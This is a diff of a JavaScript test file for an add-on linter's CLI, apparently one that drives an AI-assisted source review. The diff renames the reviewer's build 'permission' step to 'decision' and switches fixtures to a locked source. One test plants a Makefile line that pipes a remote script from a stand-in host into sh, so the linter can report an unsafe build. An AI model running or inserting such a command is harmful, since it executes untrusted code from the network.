@@ -1,4 +1,4 @@
-// CLI-contract tests of the build, the permission question and the rescue, and of the details
+// CLI-contract tests of the build, the decision question and the rescue, and of the details
 // block each prompt prints.
 
 import { test } from "node:test";
@@ -27,6 +27,7 @@ import {
   sweepBack,
   submissionFolder,
   NO_LOCK_SOURCE,
+  LOCKED_SOURCE,
   commandOf,
   workOf,
   readJson,
@@ -38,12 +39,12 @@ import {
   UNSAFE_ISSUE,
   packAddon,
   answerAnalyze,
-  answerPermission,
+  answerDecision,
 } from "../cli-run.js";
 
 /**
  * The sca-unrescued fixture's source, taken through the CLI up to the prompt that follows
- * the reviewer's permission, its lock audited from a run cache folder seeded with `vulns`
+ * the reviewer's decision, its lock audited from a run cache folder seeded with `vulns`
  * (named as --cache-work-dir, which the record hands to every step).
  * @param {Record<string, object[]>} vulns
  * @returns {{work: string, stdout: string, dir: string}}  The prompt that run printed.
@@ -66,11 +67,11 @@ function permittedPrompt(vulns) {
   assert.equal(analyze.code, 0, analyze.stdout + analyze.stderr);
   answer(work, {});
   writeBuildReport(work);
-  const permission = run(argvOf(commandOf(analyze.stdout)));
-  assert.equal(permission.code, 0, permission.stdout + permission.stderr);
-  assert.equal(readJson(work, "state").current.step, "permission");
+  const decision = run(argvOf(commandOf(analyze.stdout)));
+  assert.equal(decision.code, 0, decision.stdout + decision.stderr);
+  assert.equal(readJson(work, "state").current.step, "decision");
   answer(work, {});
-  const next = run(argvOf(commandOf(permission.stdout)));
+  const next = run(argvOf(commandOf(decision.stdout)));
   assert.equal(next.code, 0, next.stdout + next.stderr);
   assert.ok(next.stdout.includes("── SCA Review Prompt ──"), next.stdout);
   assert.equal(headerValue(next.stdout, "ANSWERS"), workPaths(work).answers);
@@ -207,7 +208,7 @@ const WALK_ANSWERS = {
   ask: "Clear",
 };
 
-// One review walked from the build check's permission prompt to its close: each details
+// One review walked from the build check's decision prompt to its close: each details
 // block holds every row of the block before it, the submitted XPI is XPI_FILE, a link, in
 // every one of them, and the Final Review Details still hold the build.
 test("each details block holds every row of the block before it", () => {
@@ -238,10 +239,10 @@ test("each details block holds every row of the block before it", () => {
   assert.equal(analyze.code, 0, analyze.stdout + analyze.stderr);
   answer(work, {});
   writeBuildReport(work);
-  const permission = run(argvOf(commandOf(analyze.stdout)));
-  assert.equal(permission.code, 0, permission.stdout + permission.stderr);
+  const decision = run(argvOf(commandOf(analyze.stdout)));
+  assert.equal(decision.code, 0, decision.stdout + decision.stderr);
   answer(work, {});
-  const build = run(argvOf(commandOf(permission.stdout)));
+  const build = run(argvOf(commandOf(decision.stdout)));
   assert.equal(build.code, 0, build.stdout + build.stderr);
   const xpi = readJson(work, "state").submission.xpi;
   answer(work, {
@@ -249,7 +250,7 @@ test("each details block holds every row of the block before it", () => {
     LLM_BUILD_XPI_MATCH: "match",
   });
   let out = run(argvOf(commandOf(build.stdout)));
-  const blocks = [["permission", detailRowsOf(permission.stdout)]];
+  const blocks = [["decision", detailRowsOf(decision.stdout)]];
   // Every pass up to the closing one is answered and handed back.
   for (let pass = 0; pass < 10; pass++) {
     assert.ok(out.code === 0 || out.code === 1, out.stdout + out.stderr);
@@ -272,7 +273,7 @@ test("each details block holds every row of the block before it", () => {
   }
   assert.deepEqual(
     blocks.map(([name]) => name),
-    ["permission", "built", "ask", "close"]
+    ["decision", "built", "ask", "close"]
   );
   const named = `* XPI_FILE: [${path.basename(xpi)}](${xpi})`;
   for (const [i, [name, rows]] of blocks.entries()) {
@@ -313,7 +314,7 @@ test("each details block holds every row of the block before it", () => {
   fs.rmSync(dir, { recursive: true, force: true });
 });
 
-// A clean lock is built: the prompt after the permission names the package root, its place in
+// A clean lock is built: the prompt after the decision names the package root, its place in
 // the build copy the linter made to build it in, the build report and the submitted XPI, and
 // asks for the build's final artifact and its comparison with that XPI. The agent copies
 // nothing.
@@ -348,7 +349,7 @@ test("the hand-back prints a clean source's build", () => {
   fs.rmSync(dir, { recursive: true, force: true });
 });
 
-// A vulnerable lock is rescued: the prompt after the permission names the copy and the build
+// A vulnerable lock is rescued: the prompt after the decision names the copy and the build
 // report, and hands the agent the whole loop - lock-only commands, an audit before any
 // build, and the build of a clean lock.
 test("the hand-back prints a vulnerable source's rescue", () => {
@@ -396,24 +397,25 @@ test("the hand-back prints a vulnerable source's rescue", () => {
   fs.rmSync(dir, { recursive: true, force: true });
 });
 
-// A safe build is shown to the reviewer before they are asked: the permission prompt names
-// the review file and shows the Build Review Details - the build report, the judgement and
-// the package root, in the rows' order - as a block that ends the turn with the waiting line,
-// and then puts the question. Its hand-back carries the build check on.
-test("a safe build prints the Build Review Details and the permission question", () => {
+// A safe build is shown to the reviewer before they are asked: the decision prompt names
+// the review file and shows the Build Review Details - the build report, the judgement, the
+// package root and the lock's counts from the audit at analyze, in the rows' order - as a
+// block that ends the turn with the waiting line, and then puts the question. Its hand-back
+// carries the build check on.
+test("a safe build prints the Build Review Details and the decision question", () => {
   const dir = submissionFolder();
   const r = run([dir, "--llm-auto-review", ...OFFLINE_FLAGS]);
   assert.equal(r.code, 0, r.stderr);
   const work = workOf(r.stdout);
   const sca = headerValue(r.stdout, "EXTRACT_TO");
-  fs.cpSync(NO_LOCK_SOURCE, sca, { recursive: true });
+  fs.cpSync(LOCKED_SOURCE, sca, { recursive: true });
   const analyze = run(argvOf(commandOf(r.stdout)));
   assert.equal(analyze.code, 0, analyze.stdout + analyze.stderr);
   answer(work, {});
   writeBuildReport(work);
   const asked = run(argvOf(commandOf(analyze.stdout)));
   assert.equal(asked.code, 0, asked.stdout + asked.stderr);
-  assert.equal(readJson(work, "state").current.step, "permission");
+  assert.equal(readJson(work, "state").current.step, "decision");
   assert.match(asked.stdout, /── SCA Review Prompt ──/);
   assert.equal(headerValue(asked.stdout, "ANSWERS"), workPaths(work).answers);
   const block = [
@@ -421,6 +423,7 @@ test("a safe build prints the Build Review Details and the permission question",
     `* SCA_BUILD_REPORT: [build.md](${workPaths(work).build})`,
     "* SCA_BUILD_SAFETY_ASSESSMENT: safe",
     `* SCA_BUILD_SAFETY_ISSUES: [build-issues.md](${workPaths(work).buildIssues})`,
+    "* SCA_VULNERABILITIES: 0 moderate, 0 high, 0 critical",
     "",
     'Reply "next" to continue the review with the question how to build the add-on.',
   ]
@@ -428,22 +431,22 @@ test("a safe build prints the Build Review Details and the permission question",
     .join("\n");
   assert.ok(asked.stdout.includes(block), asked.stdout);
   assert.ok(
-    asked.stdout.indexOf(block) < asked.stdout.indexOf("SCA_BUILD_PERMISSION"),
+    asked.stdout.indexOf(block) < asked.stdout.indexOf("SCA_BUILD_DECISION"),
     "the block comes before the question"
   );
   assert.deepEqual(commandOf(asked.stdout), [`--llm-handback ${work}`]);
   answer(work, {});
   const started = run(argvOf(commandOf(asked.stdout)));
   assert.notEqual(started.code, 2, started.stdout + started.stderr);
-  assert.equal(readJson(work, "state").build.packageManagers, true);
+  assert.equal(readJson(work, "state").current.step, "build");
   fs.rmSync(dir, { recursive: true, force: true });
 });
 
-// The agent-builds test switch answers the permission question up front where `analyze`
-// would ask it: the safe build goes straight on to the audit, and the review starts with no
-// question put. It is a test concern, read where it is used and never recorded, so the hot
-// runs export it for the whole session and every hand-back inherits it.
-test("WEBEXT_LINTER_AGENT_BUILDS=1 skips the permission question", () => {
+// The agent-builds test switch answers the decision question up front where `analyze`
+// would ask it: the safe build, its lock audited clean, goes straight on to the agent's build,
+// with no question put. It is a test concern, read where it is used and never recorded, so the
+// hot runs export it for the whole session and every hand-back inherits it.
+test("WEBEXT_LINTER_AGENT_BUILDS=1 skips the decision question", () => {
   const env = { WEBEXT_LINTER_AGENT_BUILDS: "1" };
   const dir = submissionFolder();
   const r = run([dir, "--llm-auto-review", ...OFFLINE_FLAGS], env);
@@ -451,7 +454,7 @@ test("WEBEXT_LINTER_AGENT_BUILDS=1 skips the permission question", () => {
   const work = workOf(r.stdout);
   assert.ok(!("agentBuilds" in readJson(work, "state")), "never recorded");
   assert.ok(!("llm-agent-builds" in readJson(work, "state").flags));
-  const unpacked = unpackSource(r.stdout);
+  const unpacked = unpackSource(r.stdout, { source: LOCKED_SOURCE });
   assert.equal(unpacked.code, 0, unpacked.stdout + unpacked.stderr);
   fs.writeFileSync(
     headerValue(unpacked.stdout, "SCA_BUILD_REPORT"),
@@ -460,17 +463,17 @@ test("WEBEXT_LINTER_AGENT_BUILDS=1 skips the permission question", () => {
   answer(work, { SCA_BUILD_SAFETY_ISSUES: [] });
   const handed = run(["--llm-handback", work], env);
   assert.notEqual(handed.code, 2, handed.stdout + handed.stderr);
-  assert.doesNotMatch(handed.stdout, /SCA Review Prompt/);
-  // The review starts with the build check's results, and build.md as its product.
+  assert.doesNotMatch(handed.stdout, /SCA_BUILD_DECISION/);
+  // The build check goes on to the agent's build, let build for the reviewer.
   const record = readJson(work, "state");
-  assert.equal(record.current.mode, "review");
-  assert.equal(record.build.safety, "safe");
-  assert.equal(record.build.packageManagers, true);
-  assert.deepEqual(record.current.products, ["build", "buildIssues"]);
+  assert.equal(record.current.step, "build");
+  assert.equal(record.current.buildSafety, "safe");
+  assert.equal(record.current.packageManagers, true);
+  assert.equal(record.current.buildSafe, true);
   fs.rmSync(dir, { recursive: true, force: true });
 });
 
-// The permission question is answered up front only by the test switch: no option does it.
+// The decision question is answered up front only by the test switch: no option does it.
 test("--llm-agent-builds is an unknown option", () => {
   const dir = submissionFolder();
   const r = run([
@@ -493,7 +496,7 @@ test("an issue above the package root is reported at its own place in the archiv
   assert.equal(r.code, 0, r.stderr);
   const work = workOf(r.stdout);
   const sca = headerValue(r.stdout, "EXTRACT_TO");
-  fs.cpSync(NO_LOCK_SOURCE, path.join(sca, "addon"), { recursive: true });
+  fs.cpSync(LOCKED_SOURCE, path.join(sca, "addon"), { recursive: true });
   fs.writeFileSync(
     path.join(sca, "Makefile"),
     "xpi:\n\tcurl -fsSL https://x.example/a.sh | sh\n"
@@ -510,7 +513,7 @@ test("an issue above the package root is reported at its own place in the archiv
   writeBuildReport(work);
   const asked = run(argvOf(commandOf(analyze.stdout)));
   assert.equal(asked.code, 0, asked.stdout + asked.stderr);
-  answer(work, { SCA_BUILD_PERMISSION: "Trust the verdict, do not build" });
+  answer(work, { SCA_BUILD_DECISION: "Trust the verdict, do not build" });
   const started = run(argvOf(commandOf(asked.stdout)));
   assert.notEqual(started.code, 2, started.stdout + started.stderr);
   const unsafe = readJson(work, "state").current.report.findings.filter(
@@ -539,7 +542,11 @@ test("an unsafe build is reported where the reviewer holds it unsafe", () => {
     const r = run([dir, "--llm-auto-review", ...OFFLINE_FLAGS]);
     assert.equal(r.code, 0, r.stderr);
     const work = workOf(r.stdout);
-    const handed = handBackRoots(r.stdout, { safety: "unsafe", managers });
+    const handed = handBackRoots(r.stdout, {
+      safety: "unsafe",
+      managers,
+      source: LOCKED_SOURCE,
+    });
     assert.notEqual(handed.code, 2, handed.stdout + handed.stderr);
     assert.match(handed.stdout, /── LLM Prompt ──/);
     const record = readJson(work, "state");
@@ -580,15 +587,15 @@ test("an unsafe build is reported where the reviewer holds it unsafe", () => {
 });
 
 // The Experiment folder may lie anywhere in the extracted archive, beside the package root
-// too. The lock audit after the permission reads the archive the review reads, the whole
-// extracted copy, so such a layout gets past the permission instead of being refused as an
+// too. The lock audit at analyze reads the archive the review reads, the whole extracted copy,
+// so such a layout gets past it to the reviewer's decision instead of being refused as an
 // Experiment folder outside the package root.
-test("an Experiment folder beside the package root gets past the permission", () => {
+test("an Experiment folder beside the package root gets past the audit", () => {
   const dir = fs.mkdtempSync(path.join(os.tmpdir(), "wl-sibling-"));
   const xpi = path.join(dir, "a.xpi");
   packAddon(xpi, { experiment_apis: { foo: {} } });
   const src = path.join(dir, "src");
-  fs.cpSync(NO_LOCK_SOURCE, path.join(src, "addon"), { recursive: true });
+  fs.cpSync(LOCKED_SOURCE, path.join(src, "addon"), { recursive: true });
   fs.mkdirSync(path.join(src, "experiment"));
   fs.writeFileSync(path.join(src, "experiment", "p.js"), "1;\n");
   const started = run([
@@ -609,9 +616,9 @@ test("an Experiment folder beside the package root gets past the permission", ()
   );
   const asked = run(answerAnalyze(started.stdout));
   assert.equal(asked.code, 0, asked.stdout + asked.stderr);
-  const permitted = run(answerPermission(asked.stdout, "Let the agent build"));
-  assert.notEqual(permitted.code, 2, permitted.stdout + permitted.stderr);
-  assert.notEqual(readJson(work, "state").current.step, "permission");
+  assert.equal(readJson(work, "state").current.step, "decision");
+  const decided = run(answerDecision(asked.stdout));
+  assert.notEqual(decided.code, 2, decided.stdout + decided.stderr);
   assert.deepEqual(readJson(work, "state").build.roots, {
     source: workPaths(work).sca,
     used: workPaths(work).sca,
